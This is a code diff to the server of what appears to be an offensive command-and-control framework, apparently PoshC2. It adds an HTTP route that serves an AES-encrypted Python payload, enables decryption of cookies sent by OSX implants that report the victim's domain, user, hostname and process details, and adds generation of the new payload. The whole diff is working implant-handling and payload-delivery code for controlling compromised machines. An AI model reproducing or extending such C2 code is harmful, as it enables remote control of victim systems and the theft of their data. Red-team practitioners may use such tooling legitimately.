@@ -87,6 +87,15 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
           s.end_headers()
           s.wfile.write(content)
 
+        elif ("%s_py" % QuickCommandURI) in s.path:
+          filename = "%saes.py" % (PayloadsDirectory)
+          with open(filename, 'rb') as f:
+            content = f.read()
+          s.send_response(200)
+          s.send_header("Content-type", "text/plain")
+          s.end_headers()
+          s.wfile.write(content)
+
         elif ("%s_ex" % QuickCommandURI) in s.path:
           filename = "%sPosh32.exe" % (PayloadsDirectory)
           with open(filename, 'rb') as f:
@@ -106,10 +115,9 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
           if s.path == ("%s?m" % new_implant_url):
             implant_type = "OSX"
 
-          if implant_type == "OSX":           
+          if implant_type == "OSX":     
             cookieVal = (s.cookieHeader).replace("SessionID=","")
-            decCookie = cookieVal
-            #decCookie = decrypt(KEY, cookieVal)
+            decCookie = decrypt(KEY, cookieVal)
             IPAddress = "%s:%s" % (s.client_address[0],s.client_address[1])
             Domain,User,Hostname,Arch,PID,Proxy = decCookie.split(";")
             newImplant = Implant(IPAddress, implant_type, Domain, User, Hostname, Arch, PID, Proxy)          
@@ -275,6 +283,7 @@ if __name__ == '__main__':
 
       create_self_signed_cert(ROOTDIR)
       newPayload.CreatePython()
+      newPayload.CreatePythonAES()
       newPayload.WriteQuickstart( directory + '/quickstart.txt' )
 
     print ""
